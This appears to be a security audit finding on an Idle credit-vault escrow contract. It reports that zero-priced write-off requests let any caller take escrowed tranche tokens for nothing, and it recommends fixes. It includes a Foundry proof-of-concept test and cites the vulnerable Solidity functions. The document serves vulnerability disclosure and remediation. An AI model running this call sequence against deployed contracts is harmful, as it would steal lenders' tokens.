### Title
Zero-priced write-off requests allow anyone to steal escrowed tranche tokens - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol])

### Summary

`createWriteOffRequest` accepts `underlyingsRequested == 0`, while `fullfillWriteOffRequest` permits any caller to satisfy a request by paying at least the requested amount. [1](#0-0) [2](#0-1) 

### Finding Description

A lender can accidentally or maliciously be induced to create a write-off request with nonzero `amount` but zero `underlyingsRequested`; the function only rejects `amount == 0`. [3](#0-2) 

Any unprivileged fulfiller can then call `fullfillWriteOffRequest(victim, victimTranches, 0)`; because `0 < 0` is false, the `WrongRequest` check passes. [4](#0-3)  The function pulls zero underlying, calculates a zero fee, pays the victim zero, and transfers all escrowed tranche tokens to the attacker. [5](#0-4) 

### Impact Explanation

The attacker receives the victim’s full escrowed tranche position for no consideration, breaking the escrow’s fair-exchange invariant. [6](#0-5)  For example, a request escrow `10_000e18` AA tranche tokens can be taken with `0` underlying; if the tranche price is `1e6` units per `1e18` tranche token, the stolen position represents approximately `10_000e6` underlying units. [2](#0-1) 

### Likelihood Explanation

The exploit requires a request whose aggregate requested underlying amount is zero, but the contract provides no validation preventing that state and requests can be created by any tranche-token holder while an epoch is running. [1](#0-0)  Once created, no privileged action, borrower cooperation, KYC status, timing constraint, or external market condition is needed to steal the escrowed tokens. [2](#0-1) 

### Recommendation

Reject `underlyingsRequested == 0` in `createWriteOffRequest`, or require a nonzero minimum underlying consideration proportional to the escrowed tranche value. [1](#0-0)  Fulfilment should also reject `_underlyings == 0` so existing zero-priced requests cannot be emptied without payment. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";

contract ZeroPriceWriteOffEscrowPoC is Test {
    // Initialized escrow whose IdleCDOEpochVariant is currently in a running epoch.
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20 tranche;
    IERC20 underlying;

    address lender = address(0xA11CE);
    address attacker = address(0xBAD);

    function testZeroPriceRequestCanBeStolen() public {
        uint256 trancheAmount = 10_000e18;

        deal(address(tranche), lender, trancheAmount);

        // Victim creates a malformed request: nonzero tranches, zero payment.
        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmount);
        escrow.createWriteOffRequest(trancheAmount, 0);
        vm.stopPrank();

        assertEq(tranche.balanceOf(address(escrow)), trancheAmount);

        // Attacker satisfies the zero-underlying request and receives all tranches.
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        assertEq(tranche.balanceOf(attacker), trancheAmount);
        assertEq(tranche.balanceOf(address(escrow)), 0);
        assertEq(underlying.balanceOf(lender), 0);
        assertEq(underlying.balanceOf(attacker), 0);
    }
}
```

The critical path is only `createWriteOffRequest(amount, 0)` followed by an arbitrary-address `fullfillWriteOffRequest(lender, amount, 0)`. [1](#0-0) [2](#0-1)

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L123-151)
```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
